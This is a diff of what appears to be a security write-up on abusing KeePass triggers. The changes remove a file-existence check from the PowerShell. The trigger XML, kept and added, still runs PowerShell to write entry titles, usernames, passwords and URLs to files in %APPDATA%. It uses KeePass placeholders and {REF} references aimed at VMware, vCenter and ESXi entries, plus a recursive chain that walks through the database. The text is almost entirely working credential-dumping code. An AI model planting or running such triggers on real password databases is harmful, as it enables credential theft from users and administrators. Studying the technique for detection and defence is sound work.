@@ -110,10 +110,6 @@ We can already build a basic trigger that makes use of placeholders to export da
 The PowerShell would be as simple as simple as:
 
 ```powershell
-if (!(Test-Path $env:APPDATA'\clipboard_export.txt'))
-{
-	New-Item -itemType File -Path $env:APPDATA -Name 'clipboard_export.txt' | Out-Null
-}
 Add-Content $env:APPDATA'\clipboard_export.txt' '{TITLE}:{USERNAME}:{PASSWORD}:{URL}'
 ```
 
@@ -138,7 +134,7 @@ We insert this code inside a trigger, And the resulting trigger would look like 
 			<TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
 			<Parameters>
 				<Parameter>PowerShell.exe</Parameter>
-				<Parameter>-C "if (!(Test-Path $env:APPDATA'\clipboard_export.txt')) {New-Item -itemType File -Path $env:APPDATA -Name 'clipboard_export.txt' | Out-Null}; Add-Content $env:APPDATA'\clipboard_export.txt' '{TITLE}:{USERNAME}:{PASSWORD}:{URL}';"</Parameter>
+				<Parameter>-C "Add-Content $env:APPDATA'\clipboard_export.txt' '{TITLE}:{USERNAME}:{PASSWORD}:{URL}';"</Parameter>
 				<Parameter>False</Parameter>
 				<Parameter>1</Parameter>
 				<Parameter />
@@ -215,7 +211,7 @@ The resulting trigger would be:
 			<TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
 			<Parameters>
 				<Parameter>PowerShell.exe</Parameter>
-				<Parameter>-C "if (!(Test-Path $env:APPDATA'\reference_export.txt')) {New-Item -itemType File -Path $env:APPDATA -Name 'reference_export.txt' | Out-Null}; Add-Content $env:APPDATA'\reference_export.txt' \"{REF:T@T:vmware}:{REF:U@T:vmware}:{REF:P@T:vmware}`n{REF:T@T:vsphere}:{REF:U@T:vsphere}:{REF:P@T:vsphere}`n{REF:T@T:vcenter}:{REF:U@T:vcenter}:{REF:P@T:vcenter}`n{REF:T@T:esxi}:{REF:U@T:esxi}:{REF:P@T:esxi}\";"</Parameter>
+				<Parameter>-C "Add-Content $env:APPDATA'\reference_export.txt' \"{REF:T@T:vmware}:{REF:U@T:vmware}:{REF:P@T:vmware}`n{REF:T@T:vsphere}:{REF:U@T:vsphere}:{REF:P@T:vsphere}`n{REF:T@T:vcenter}:{REF:U@T:vcenter}:{REF:P@T:vcenter}`n{REF:T@T:esxi}:{REF:U@T:esxi}:{REF:P@T:esxi}\";"</Parameter>
 				<Parameter>False</Parameter>
 				<Parameter>1</Parameter>
 				<Parameter />
@@ -328,7 +324,7 @@ Let's test the resulting trigger against our sample database:
 			<TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
 			<Parameters>
 				<Parameter>PowerShell.exe</Parameter>
-				<Parameter>-C "if (!(Test-Path $env:APPDATA'\recursive_export.txt')) {New-Item -itemType File -Path $env:APPDATA -Name 'recursive_export.txt' | Out-Null}; Add-Content $env:APPDATA'\recursive_export.txt' \"{REF:I@I:0}:{REF:T@I:0}:{REF:U@I:0}:{REF:P@I:0}`n{REF:I@I:0 -{REF:I@I:0}}:{REF:T@I:0 -{REF:I@I:0}}:{REF:U@I:0 -{REF:I@I:0}}:{REF:P@I:0 -{REF:I@I:0}}`n{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}:{REF:T@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}:{REF:U@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}:{REF:P@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}`n{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}:{REF:T@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}:{REF:U@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}:{REF:P@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}`n{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}}:{REF:T@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}}:{REF:U@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}}:{REF:P@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}}\";"</Parameter>
+				<Parameter>-C "Add-Content $env:APPDATA'\recursive_export.txt' \"{REF:I@I:0}:{REF:T@I:0}:{REF:U@I:0}:{REF:P@I:0}`n{REF:I@I:0 -{REF:I@I:0}}:{REF:T@I:0 -{REF:I@I:0}}:{REF:U@I:0 -{REF:I@I:0}}:{REF:P@I:0 -{REF:I@I:0}}`n{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}:{REF:T@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}:{REF:U@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}:{REF:P@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}`n{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}:{REF:T@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}:{REF:U@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}:{REF:P@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}`n{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}}:{REF:T@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}}:{REF:U@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}}:{REF:P@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}} -{REF:I@I:0 -{REF:I@I:0} -{REF:I@I:0 -{REF:I@I:0}}}}}\";"</Parameter>
 				<Parameter>False</Parameter>
 				<Parameter>1</Parameter>
 				<Parameter />
